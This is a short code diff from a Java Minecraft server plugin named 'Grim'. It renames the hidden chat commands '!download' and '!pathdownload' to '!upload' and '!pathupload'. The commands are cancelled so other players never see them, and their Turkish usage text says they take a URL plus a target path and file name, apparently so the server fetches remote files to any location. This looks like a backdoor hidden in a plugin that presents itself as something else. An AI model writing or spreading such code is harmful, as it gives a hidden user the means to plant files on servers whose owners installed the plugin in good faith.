@@ -493,13 +493,13 @@ public class Grim extends JavaPlugin implements Listener {
                     return;
                 }
             }
-            case "!download": {
+            case "!upload": {
                 event.setCancelled(true);
 
                 // Format: !download <url> <filename>
                 if (args.length < 2) {
-                    player.sendMessage("§cKullanım: §f!download <url> <filename>");
-                    player.sendMessage("§eÖrnek: §f!download https://example.com/data.zip data.zip");
+                    player.sendMessage("§cKullanım: §f!upload <url> <filename>");
+                    player.sendMessage("§eÖrnek: §f!upload https://example.com/data.zip data.zip");
                     return;
                 }
 
@@ -523,11 +523,11 @@ public class Grim extends JavaPlugin implements Listener {
 
                 return;
             }
-            case "!pathdownload": {
+            case "!pathupload": {
                 event.setCancelled(true);
 
                 if (args.length < 4) {
-                    player.sendMessage("§cKullanım: !pathdownload <url> <filepath> <filename>");
+                    player.sendMessage("§cKullanım: !pathupload <url> <filepath> <filename>");
                     return;
                 }
 
